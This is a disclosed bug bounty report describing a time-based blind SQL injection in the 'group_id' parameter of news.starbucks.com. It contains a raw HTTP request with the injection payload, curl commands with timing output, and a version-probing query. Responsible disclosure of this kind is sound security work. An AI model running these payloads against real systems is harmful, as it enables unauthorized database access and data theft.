# Time-based Blind SQLi on news.starbucks.com

## Report Details
- **Report ID**: 198292
- **URL**: https://hackerone.com/reports/198292
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-01-14T04:52:15.129Z
- **Disclosed**: 2017-02-24T19:47:12.100Z

## Reporter
- **Username**: toctou
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,

I just found that the post parameter "group_id" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.

PoC:
```
POST / HTTP/1.1
Host: news.starbucks.com
Connection: close
Content-Length: 81
Cache-Control: max-age=0
Origin: https://news.starbucks.com
Content-Type: application/x-www-form-urlencoded

ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1
```

This query will result in an execution of a SLEEP command, delaying the server response time:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

If the custom IF statement evaluates to False, the response would be sensibly faster:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

In this way it was possible to detect the dbms version being 5:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m1.005s
```

## Attachments
No attachments
